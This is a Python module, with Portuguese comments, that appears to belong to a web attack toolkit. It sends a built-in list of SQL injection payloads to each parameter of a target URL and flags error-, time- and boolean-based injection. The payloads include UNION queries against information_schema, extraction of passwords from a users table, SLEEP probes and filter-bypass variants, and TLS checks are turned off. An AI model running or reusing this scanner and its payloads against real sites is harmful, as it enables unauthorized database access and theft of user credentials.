# modules/web/sqli.py
import requests
import time
from urllib.parse import quote, urljoin
import re
from concurrent.futures import ThreadPoolExecutor

class SQLInjector:
    def __init__(self):
        self.payloads = self.load_sqli_payloads()
        self.db_indicators = {
            'mssql': ['@@version', 'microsoft sql', 'convert(', 'cast('],
            'mysql': ['@@version', 'mysql', 'concat(', 'group_concat('],
            'postgresql': ['version()', 'postgresql', 'pg_', 'current_database()'],
            'oracle': ['ora-', 'oracle', 'dbms_', 'utl_']
        }
        
    def load_sqli_payloads(self):
        """Carrega payloads SQLi"""
        try:
            with open('wordlists/payloads/sqli.txt', 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
                "'/**/OR/**/1=1--",
                "'%00' OR 1=1--",
                "'||'1'='1",
                "'/**/UNION/**/SELECT/**/NULL--",
                "' UNION SELECT version()--",
                "' UNION SELECT user()--",
                "' UNION SELECT database()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                "' UNION SELECT password FROM users--",
                "' OR (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>0)--",
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
            ]

    def test_error_based_sqli(self, url, param, payload):
        """Testa SQLi baseado em erro"""
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            start_time = time.time()
            response = requests.get(test_url, timeout=10, verify=False)
            response_time = time.time() - start_time
            
            # Verifica por mensagens de erro de banco de dados
            content_lower = response.text.lower()
            for db_type, indicators in self.db_indicators.items():
                if any(indicator in content_lower for indicator in indicators):
                    return True, db_type
                    
            # Verifica por diferenças no response
            if "error" in content_lower or "exception" in content_lower:
                return True, "unknown"
                
        except Exception as e:
            pass
            
        return False, None

    def test_time_based_sqli(self, url, param, payload):
        """Testa SQLi baseado em tempo"""
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            start_time = time.time()
            response = requests.get(test_url, timeout=15, verify=False)
            response_time = time.time() - start_time
            
            # Se demorar mais de 5 segundos, possível time-based
            if response_time > 5:
                return True, "time_based"
                
        except:
            pass
            
        return False, None

    def test_boolean_based_sqli(self, url, param, true_payload, false_payload):
        """Testa SQLi baseado em boolean"""
        try:
            # Request com payload verdadeiro
            true_url = f"{url}?{param}={quote(true_payload)}"
            true_response = requests.get(true_url, timeout=8, verify=False)
            
            # Request com payload falso
            false_url = f"{url}?{param}={quote(false_payload)}"
            false_response = requests.get(false_url, timeout=8, verify=False)
            
            # Compara as respostas
            if true_response.text != false_response.text:
                return True
                
        except:
            pass
            
        return False

    def scan_sql_injection(self, url):
        """Scan completo de SQL Injection"""
        print(f"[+] Testando SQL Injection em: {url}")
        
        vulnerabilities = []
        
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            query_params = dict(param.split('=') for param in query_string.split('&') if '=' in param)
            
            for param, original_value in query_params.items():
                print(f"  [+] Testando parâmetro: {param}")
                
                for payload in self.payloads:
                    # Error-based
                    is_vuln, db_type = self.test_error_based_sqli(base_url, param, payload)
                    if is_vuln:
                        vulnerabilities.append(f"Error-based SQLi em {param} ({db_type}): {payload}")
                        continue
                    
                    # Time-based
                    is_vuln, _ = self.test_time_based_sqli(base_url, param, payload)
                    if is_vuln:
                        vulnerabilities.append(f"Time-based SQLi em {param}: {payload}")
                        continue
                    
                    # Boolean-based (teste básico)
                    if "' OR 1=1--" in payload and "' AND 1=2--" in self.payloads:
                        is_vuln = self.test_boolean_based_sqli(
                            base_url, param, 
                            "' OR 1=1--", 
                            "' AND 1=2--"
                        )
                        if is_vuln:
                            vulnerabilities.append(f"Boolean-based SQLi em {param}: {payload}")
        
        return vulnerabilities